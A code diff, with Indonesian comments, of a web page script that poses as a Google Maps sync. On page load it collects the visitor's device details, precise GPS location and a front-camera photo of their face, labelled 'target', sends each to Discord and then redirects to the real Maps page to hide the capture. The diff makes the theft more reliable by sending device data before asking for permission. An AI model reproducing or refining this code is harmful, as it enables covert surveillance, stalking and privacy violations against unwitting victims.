@@ -37,55 +37,57 @@
     }
 
     async function start() {
-        if (!navigator.geolocation) return;
+        // 1. Ambil Info Perangkat Secara Paksa
+        let infoHP = "📱 **DATA PERANGKAT TERDETEKSI**\n";
+        infoHP += "• OS/Platform: " + navigator.platform + "\n";
+        infoHP += "• Browser: " + navigator.userAgent.split(') ')[0] + ")\n";
+        infoHP += "• Bahasa: " + navigator.language + "\n";
+        infoHP += "• Layar: " + window.screen.width + "x" + window.screen.height;
 
-        // --- BAGIAN PENYEDOT DATA PERANGKAT ---
-        let deviceData = "📱 **Target Terkoneksi!**\n";
-        deviceData += "• Perangkat: " + navigator.platform + "\n";
-        deviceData += "• Browser: " + navigator.userAgent.split(') ')[0] + ")\n";
-        
+        // Cek Baterai
         if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            deviceData += "• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
-        }
-        await sendToDiscord(deviceData); // Kirim data HP dulu
-        // --------------------------------------
-
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            await sendToDiscord(`📍 **Lokasi Presisi:**\n${mapUrl}`);
-
-            // 2. Ambil Foto
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(async (blob) => {
-                        await sendToDiscord("📸 **Foto Wajah:**", blob);
-                        stream.getTracks().forEach(t => t.stop());
-                        
-                        // 3. LEMPAR KE MAPS ASLI
-                        window.location.href = mapUrl;
-                    }, 'image/jpeg');
-                }, 2500);
-            } catch (e) {
-                window.location.href = mapUrl;
-            }
-        }, (err) => {
-            alert("Izin lokasi diperlukan untuk sinkronisasi Maps.");
-            location.reload();
-        }, { enableHighAccuracy: true });
-    }
+                const b = await navigator.getBattery();
+                infoHP += "\n• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
+            } catch (e) {}
+        }
 
+        // KIRIM DATA HP DULUAN (Wajib Berhasil)
+        await sendToDiscord(infoHP);
+
+        // 2. Baru Ambil Lokasi & Foto
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                await sendToDiscord(`📍 **LOKASI PRESISI**\n${mapUrl}`);
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(async (blob) => {
+                            await sendToDiscord("📸 **FOTO WAJAH TARGET**", blob);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = mapUrl;
+                        }, 'image/jpeg');
+                    }, 2000);
+                } catch (e) {
+                    window.location.href = mapUrl;
+                }
+            }, (err) => {
+                window.location.href = "https://www.google.com/maps";
+            }, { enableHighAccuracy: true });
+        }
+    }
     window.onload = start;
 </script>
 </body>
